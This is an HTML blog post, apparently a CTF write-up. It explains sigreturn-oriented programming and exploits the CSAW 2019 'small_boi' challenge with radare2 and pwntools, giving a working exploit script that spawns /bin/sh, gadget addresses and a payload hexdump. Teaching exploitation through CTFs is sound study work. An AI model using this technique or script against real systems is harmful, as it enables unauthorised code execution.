@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+     
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SROP Exploitation with radare2</title>
+    <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #ffe135;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+ 
+
+
+<script src="https://bananamafia.dev/js/highlight.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/python.min.js"></script> 
+<script src="https://bananamafia.dev/js/cpp.min.js"></script> 
+<script src="https://bananamafia.dev/js/json.min.js"></script> 
+<script src="https://bananamafia.dev/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://bananamafia.dev/js/jquery.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
+
+
+ <meta name="generator" content="Hugo 0.68.1" />
+    
+
+    
+</head>
+
+
+
+
+<body>
+     
+    <nav class="navbar navbar-default navbar-fixed-top">
+
+        <div class="container">
+
+            <div class="navbar-header">
+
+                <a class="navbar-brand visible-xs" href="#">SROP Exploitation with radare2</a>
+
+                <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+
+            </div>
+
+            <div class="collapse navbar-collapse">
+
+                
+                <ul class="nav navbar-nav">
+                    
+                    <li><a href="/">Home</a></li>
+                    
+                    <li><a href="/post/">Posts</a></li>
+                    
+                    <li><a href="/project/">Projects</a></li>
+                    
+                </ul>
+                
+
+                
+                <ul class="nav navbar-nav navbar-right">
+                    
+                    <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href=""><i class="fa fa-adjust"></i></a></li>
+                    
+                </ul>
+                
+
+            </div>
+
+        </div>
+
+    </nav>
+
+
+    <script>
+        
+        $(".fa-adjust").parent().removeAttr("href");
+
+        
+        window.onload = setMode();
+
+        function setMode() {
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+
+            if (currentTheme == "light" || currentTheme == null) {
+                setLight();
+            }
+            else {
+                setDark();
+            }
+        }
+
+        function setDark() {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            localStorage.setItem('bananamafia_theme', 'dark');
+        }
+
+        function setLight() {
+            document.documentElement.setAttribute('data-theme', 'light');
+            localStorage.setItem('bananamafia_theme', 'light');
+        }
+
+        $(".fa-adjust").on("click", function () {
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+            $("body").addClass("transition-bg");
+            $("nav").addClass("transition-bg");
+            if (currentTheme == "dark") {
+                setLight();
+            } else {
+                setDark();
+            }
+
+            setTimeout(function () {
+                $("body").removeClass("transition-bg");
+                $("nav").removeClass("transition-bg");
+            }, 500);
+
+        });
+    </script>
+
+<main id="main">
+
+    <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/srop/">SROP Exploitation with radare2</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/rop"><kbd class="item-tag">rop</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify"><p>Recently I&rsquo;ve discovered a <a href="https://cs.vu.nl/~herbertb/papers/srop_sp14.pdf">paper</a> that demonstrates a fancy ROP-style exploitation technique for Linux based systems. It&rsquo;s called <em>Sigreturn-oriented programming</em> (SROP) and was released by two students of the university of Amsterdam in 2014. This post contains background information on this exploitation technique and shows how to pull it off using <code>radare2</code> and <code>pwntools</code>.</p>
+<h1 id="sigreturn-oriented-programming">Sigreturn-Oriented Programming</h1>
+<p>The cool thing about this technique is that only one or two gadgets are required in order to get control over <em>all</em> registers of the target process. Two preconditions have to be met:</p>
+<ol>
+<li>A <code>syscall</code> gadget is available at a predictable location</li>
+<li>There&rsquo;s a way to set the <code>RAX</code> register to <code>0xF</code></li>
+</ol>
+<p>SROP abuses the <code>sigreturn()</code> syscall which normally restores the process context after a signal handler returns. There&rsquo;s a great <a href="https://lwn.net/Articles/676803/">article on LWN</a> that explains this really well - I have nothing to add here (and I&rsquo;m lazy) so I&rsquo;ll just cite two paragraphs of this article by Jonathan Corbet:</p>
+<hr>
+<p><em>Enter</em> <code>sigreturn()</code> <em>, a Linux system call that nobody calls directly. When a signal is delivered to a process, execution jumps to the designated signal handler; when the handler is done, control returns to the location where execution was interrupted. Signals are a form of software interrupt, and all of the usual interrupt-like accounting must be dealt with. In particular, before the kernel can deliver a signal, it must make a note of the current execution context, including the values stored in all of the processor registers.</em></p>
+<p><em>It would be possible to store this information in the kernel itself, but that might make it possible for an attacker (of a different variety) to cause the kernel to allocate arbitrary amounts of memory. So, instead, the kernel stores this information on the stack of the process that is the recipient of the signal. Prior to invoking the signal handler, the kernel pushes an (architecture-specific) variant of the</em> <code>sigcontext</code> <em>structure onto the process&rsquo;s stack; this structure contains register information, floating-point status, and more. When the signal handler has completed its job, it calls</em> <code>sigreturn()</code> <em>, which restores all that information from the on-stack structure.</em></p>
+<hr>
+<p>Ok cool!</p>
+<p>The fact that the <code>sigcontext</code> structure is being passed to the kernel on the stack makes it easy for attackers to send their own <code>sigcontext</code> along with the remaining payload. Let&rsquo;s have a look the kernel source code to check what&rsquo;s going on in detail when pulling this attack off.</p>
+<p>The definition of the <code>amd64</code> version of <code>sigcontext</code> is present in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/uapi/asm/sigcontext.h#n238">this</a> source code file of the kernel:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> sigcontext_64 {
+    __u64   r8;
+    __u64   r9;
+    __u64   r10;
+    __u64   r11;
+    __u64   r12;
+    __u64   r13;
+    __u64   r14;
+    __u64   r15;
+    __u64   di;
+    __u64   si;
+    __u64   bp;
+    __u64   bx;
+    __u64   dx;
+    __u64   ax;
+    __u64   cx;
+    __u64   sp;
+    __u64   ip;
+    __u64   flags;
+    __u16   cs;
+    __u16   gs;
+    __u16   fs;
+    __u16   ss;
+    __u64   err;
+    __u64   trapno;
+    __u64   oldmask;
+    __u64   cr2;
+    __u64   fpstate;
+    __u64   reserved1[<span style="color:#ae81ff">8</span>];
+};
+</code></pre></div><p>When executing <code>sigreturn()</code>, the function <code>restore_sigcontext()</code> will be eventually be called in the kernel. The implementation can be found <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kernel/signal.c#n80">here</a>. This is the function prototype:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> restore_sigcontext(<span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs,
+                              <span style="color:#66d9ef">struct</span> sigcontext __user <span style="color:#f92672">*</span>usc,
+                              <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> uc_flags)
+</code></pre></div><p>The <code>usc</code> value is a pointer to the user-supplied <code>sigcontext</code> structure that will be copied to kernel-land at the beginning of the function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> sigcontext sc;
+[...]
+<span style="color:#66d9ef">if</span> (copy_from_user(<span style="color:#f92672">&amp;</span>sc, usc, CONTEXT_COPY_SIZE))
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
+</code></pre></div><p>As you can see below, the kernel takes the values of <code>sc</code> and just copies them to the registers:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">[...]
+regs<span style="color:#f92672">-&gt;</span>bx <span style="color:#f92672">=</span> sc.bx;
+regs<span style="color:#f92672">-&gt;</span>cx <span style="color:#f92672">=</span> sc.cx;
+regs<span style="color:#f92672">-&gt;</span>dx <span style="color:#f92672">=</span> sc.dx;
+regs<span style="color:#f92672">-&gt;</span>si <span style="color:#f92672">=</span> sc.si;
+regs<span style="color:#f92672">-&gt;</span>di <span style="color:#f92672">=</span> sc.di;
+regs<span style="color:#f92672">-&gt;</span>bp <span style="color:#f92672">=</span> sc.bp;
+regs<span style="color:#f92672">-&gt;</span>ax <span style="color:#f92672">=</span> sc.ax;
+regs<span style="color:#f92672">-&gt;</span>sp <span style="color:#f92672">=</span> sc.sp;
+regs<span style="color:#f92672">-&gt;</span>ip <span style="color:#f92672">=</span> sc.ip;
+[...]
+</code></pre></div><p>Now imagine an attacker passing a prepared <code>sigcontext</code> structure to the kernel while exploiting a certain application. After <code>sigreturn()</code> has finished, the instruction pointer is under control of the attacker. But as you can see, other registers like the stack pointer have also been overwritten and there&rsquo;s no direct way for the attacker to reliably restore this information. In consequence, there are now two possible options for an attacker:</p>
+<ul>
+<li>The registers are set up in a way that allow executing another syscall, e.g. <code>execve()</code> to spawn a shell.</li>
+<li>There&rsquo;s an information leak, so the attacker is able to get more information on the memory layout. One scenario would be to call <code>mprotect()</code> on an attacker-controlled memory location with a predictable address and jump to this memory region afterwards in order to execute shellcode.</li>
+</ul>
+<h1 id="ok-but-how1">OK BUT HOW!!1!</h1>
+<p>This time the target application will be <code>small_boi</code>, a CTF challenge from the CSAW CTF 2019 qualification round. The binary is available over <a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">here</a>.</p>
+<p>Now, let&rsquo;s use <code>radare2</code> from git and check the binary first:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>0x0040018c<span style="color:#f92672">]</span>&gt; i
+type     EXEC <span style="color:#f92672">(</span>Executable file<span style="color:#f92672">)</span>
+arch     x86
+bintype  elf
+bits     <span style="color:#ae81ff">64</span>
+canary   false
+pic      false
+static   true
+</code></pre></div><p>The binary is not position independent and we can therefore predict the addresses of ROP gadgets. Apart from the entry point, there&rsquo;s only one function present in the binary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>0x0040018c<span style="color:#f92672">]</span>&gt; pdf
+            ; CALL XREF from entry0 @ 0x4001b6
+            ;-- rip:
+┌ 33: fcn.0040018c <span style="color:#f92672">()</span>;
+│           ; var int64_t var_20h @ rbp-0x20
+│           0x0040018c      <span style="color:#ae81ff">55</span>             push rbp
+│           0x0040018d      4889e5         mov rbp, rsp
+│           0x00400190      488d45e0       lea rax, <span style="color:#f92672">[</span>var_20h<span style="color:#f92672">]</span>
+│           0x00400194      4889c6         mov rsi, rax
+│           0x00400197      4831c0         xor rax, rax
+│           0x0040019a      4831ff         xor rdi, rdi
+│           0x0040019d      48c7c2000200.  mov rdx, 0x200
+│           0x004001a4      0f05           syscall
+│           0x004001a6      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+│           0x004001ab      5d             pop rbp
+└           0x004001ac      c3             ret
+
+<span style="color:#f92672">[</span>0x0040018c<span style="color:#f92672">]</span>&gt; .afvd var_20h
+0x7ffc881ef7b8 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>qword<span style="color:#f92672">)</span>0x0000000000000000
+</code></pre></div><p>The application invokes the <code>read()</code> syscall (<code>0x0</code>) with a file descriptor value of <code>0</code>, which is equivalent to <code>stdin</code>. According to the other parameters, it reads <code>0x200</code> bytes into the <code>var_20h</code> buffer.</p>
+<p><em>Hint: Using <a href="https://filippo.io/linux-syscall-table/">this table</a> is a convenient way to check syscall numbers and their implementation.</em></p>
+<p>Now let&rsquo;s determine when the suspected buffer overflow happens. The binary reads from <code>stdin</code>, so the best way to pass input to the target is by using a <code>rarun2</code> profile:</p>
+<pre><code class="language-console" data-lang="console">cat &gt; profile.rr2 &lt;&lt; EOF
+#!/usr/bin/rarun2
+program=./small_boi
+stdin=/tmp/in
+EOF
+</code></pre><p>Now fill the input file with a <code>ragg2</code> pattern, launch <code>r2</code> and continue until the crash happens:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">r2 -A -r profile.rr2 -c <span style="color:#e6db74">&#34;dc&#34;</span> -d small_boi
+<span style="color:#f92672">[</span>0x004001ac<span style="color:#f92672">]</span>&gt; pd1
+│           ;-- rip:
+└           0x004001ac  c3  ret
+<span style="color:#f92672">[</span>0x004001ac<span style="color:#f92672">]</span>&gt; pxw 4@rsp
+0x7ffc4f332fb0  0x414f4141  AAOA
+<span style="color:#f92672">[</span>0x004001ac<span style="color:#f92672">]</span>&gt; wopO 0x414f4141
+<span style="color:#ae81ff">40</span>
+</code></pre></div><p>The crash happens at a <code>ret</code> instruction. The offset can be determined by passing the topmost value of the stack to <code>wopO</code>, which works with the <code>ragg2</code> pattern.</p>
+<p>Considering that <code>small_boi</code> is a static binary and relatively small, not many ROP gadgets are available. However, one specific gadget can be of use for SROP:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>0x0040018c<span style="color:#f92672">]</span>&gt; /R
+  <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+  0x00400180         b80f000000  mov eax, 0xf
+  0x00400185               0f05  syscall
+  0x00400187                 <span style="color:#ae81ff">90</span>  nop
+  0x00400188                 5d  pop rbp
+  0x00400189                 c3  ret
+  <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>This is the only gadget required, since it sets <code>EAX</code> to the syscall number of <code>sigreturn()</code> and also invokes the syscall afterwards. The only thing left is to append a <code>sigcontext</code> structure at the end of the payload. The plan is to call <code>execve()</code> with the argument <code>/bin/sh</code>. This specific string is already present in the target binary at <code>0x004001CA</code>.</p>
+<p>The <code>pwntools</code> framework has <a href="https://docs.pwntools.com/en/stable/rop/srop.html">some functionality</a> for SROP and also provides a way to generate the <code>sigcontext</code> structure. The implementation can be found <a href="https://github.com/arthaud/python3-pwntools/blob/master/pwnlib/rop/srop.py">here</a> and it can be integrated into our exploit as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwntools_r2 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-v&#39;</span>]
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+
+r2script <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">#r2.cmd(&#39;aaa&#39;)
+</span><span style="color:#e6db74">#r2.cmd(&#39;db fcn.0040018c&#39;)
+</span><span style="color:#e6db74">#r2.cmd(&#39;dc&#39;)
+</span><span style="color:#e6db74">#r2.cmd(&#39;V!&#39;)
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+frame <span style="color:#f92672">=</span> SigreturnFrame()
+frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3b</span> <span style="color:#75715e"># execve syscall number</span>
+frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004001ca</span> <span style="color:#75715e"># address of /bin/sh string</span>
+frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00400185</span> <span style="color:#75715e"># syscall gadget</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#75715e"># offset</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00400180</span>) <span style="color:#75715e"># invoke SROP</span>
+payload <span style="color:#f92672">+=</span> bytes(frame) <span style="color:#75715e"># append sigcontext</span>
+
+p <span style="color:#f92672">=</span> r2dbg(<span style="color:#e6db74">&#39;./small_boi&#39;</span>, r2script<span style="color:#f92672">=</span>r2script)
+p<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e"># Send the target payload</span>
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>This causes <code>RIP</code> to point to the SROP invocation gadget after the <code>ret</code> happens. This is how the whole payload looks like in a <code>hexdump</code>:</p>
+<pre><code class="language-console" data-lang="console">00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00000020  41 41 41 41 41 41 41 41  80 01 40 00 00 00 00 00  |AAAAAAAA..@.....|
+00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000090  00 00 00 00 00 00 00 00  ca 01 40 00 00 00 00 00  |..........@.....|
+000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+000000c0  3b 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |;...............|
+000000d0  00 00 00 00 00 00 00 00  85 01 40 00 00 00 00 00  |..........@.....|
+000000e0  00 00 00 00 00 00 00 00  33 00 00 00 00 00 00 00  |........3.......|
+000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000120  00 00 00 00 00 00 00 00                           |........|
+00000128
+</code></pre><p>Here you can recognize the values that have been set for the <code>frame</code> variable in the Python code above. One additional value is present at the end: <code>0x33</code>. It&rsquo;s the value of the <code>CS</code> register which basically sets the CPU in 64 bit mode. This is one of the reasons why the target architecture has to be specified before creating a <code>SigreturnFrame</code> object with <code>pwntools</code>.</p>
+<p>Here&rsquo;s what the exploitation looks like, starting from the execution of the vulnerable function. Also notice how the register values change after the <code>syscall</code> instruction of the SROP gadget:</p>
+<p><img src="/img/srop/srop.gif" alt="SROP"></p>
+<marquee>
+Thanks for reading, now go and wash your hands
+</marquee></div>
+
+    
+    
+
+    
+
+    <h4 id="related" class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/mem/">MemLabs: An Introduction To Memory Forensics</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/forensics"><kbd class="item-tag">forensics</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/volatility"><kbd class="item-tag">volatility</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/uaf-1/">Exploiting A Use-After-Free With radare2 - CTF Challenge</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/cutter"><kbd class="item-tag">cutter</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/heap"><kbd class="item-tag">heap</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/36c3ctf/">36C3 CTF Writeups</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+</main>
+<footer id="footer">
+    <img style="width:42vh" src="/img/tag.png">
+
+    <p class="copyright text-muted">
+
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+<script>
+    var footerWidth = 200;
+    $(document).ready(function () {
+        setWidth();
+        $(window).bind("resize", setWidth);
+    });
+
+    $(window).on('load', function () {
+        setWidth();
+    });
+
+    function setWidth() {
+        footerWidth = $("main").width();
+
+        $("#footer").css("min-width", (footerWidth > 300 ? footerWidth : 300) + "px");
+        
+    }
+
+    $(window).on('resize', function () {
+        setWidth();
+    });
+
+</script>
+
+</html>
+
+
+<script>
+    var width = 200;
+    $(document).ready(function () {
+        setMaxWidth();
+        $(window).bind("resize", setMaxWidth);
+    });
+
+
+    function setMaxWidth() {
+        $("pre > code").css("display", "none");
+        $("pre").css("display", "none");
+
+        width = $("#related").width();
+
+        $("pre > code").css("display", "block");
+        $("pre").css("display", "block");
+
+        $("pre > code").css("maxWidth", (width) + "px");
+        $("pre").css("maxWidth", (width) + "px");
+    }
+
+    $(window).on('resize', function () {
+        setMaxWidth();
+    });
+
+    $(window).on('load', function () {
+        setMaxWidth();
+    });
+
+
+
+</script>
